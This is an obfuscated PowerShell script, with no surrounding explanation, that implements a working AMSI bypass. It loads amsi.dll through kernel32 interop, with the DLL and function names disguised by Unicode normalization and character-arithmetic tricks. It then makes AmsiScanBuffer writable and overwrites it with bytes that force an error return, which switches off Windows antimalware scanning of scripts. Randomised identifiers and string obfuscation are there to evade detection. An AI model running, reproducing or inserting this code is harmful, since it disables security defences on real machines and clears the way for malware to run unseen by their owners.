$RyPDFIEI = @"
using System;
using System.Runtime.InteropServices;
public class RyPDFIEI {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Oc81C, string z0AAXOBu3zb);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr FfBEqlmpIHFYl8j27f, UIntPtr Y24aFZrr, uint Ro1Ti7, out uint zX57U7eHy);
}
"@

Add-Type $RyPDFIEI

$CX0S = [RyPDFIEI]::LoadLibrary("$(('ã'+'m'+'s'+'í'+'.'+'d'+'l'+'l').NoRmaLiZe([ChAR](70+18-18)+[CHAR]([bYte]0x6f)+[chAr](53+61)+[chaR]([BYte]0x6d)+[chAR]([bYTe]0x44)) -replace [cHar](9+83)+[CHAR]([byte]0x70)+[ChAR](83+40)+[cHAR](77+28-28)+[Char](62+48)+[chAR]([Byte]0x7d))")
$mW3GX42 = [RyPDFIEI]::GetProcAddress($CX0S, "$(('ÁmsíScànB'+'úffér').noRmAlIzE([cHAR]([byTE]0x46)+[chAr]([byte]0x6f)+[CHAr](114*55/55)+[chAR](109)+[cHAR](68*59/59)) -replace [cHAr]([byTe]0x5c)+[ChAr]([byTE]0x70)+[CHAr](63+60)+[cHAr](77*61/61)+[CHAr]([BYtE]0x6e)+[ChAR]([BYTe]0x7d))")
$p = 0
[RyPDFIEI]::VirtualProtect($mW3GX42, [uint32]5, 0x40, [ref]$p)
$J7aH0Jy6HvO1s4vy = "0xB8"
$YzejcAXWwO9nP0W = "0x57"
$BXZR7qiWJ = "0x00"
$fGZc = "0x07"
$npL0VlfiL2N = "0x80"
$nBDyAd0r4 = "0xC3"
$ReZJgMgJxzl = [Byte[]] ($J7aH0Jy6HvO1s4vy,$YzejcAXWwO9nP0W,$BXZR7qiWJ,$fGZc,+$npL0VlfiL2N,+$nBDyAd0r4)
[System.Runtime.InteropServices.Marshal]::Copy($ReZJgMgJxzl, 0, $mW3GX42, 6)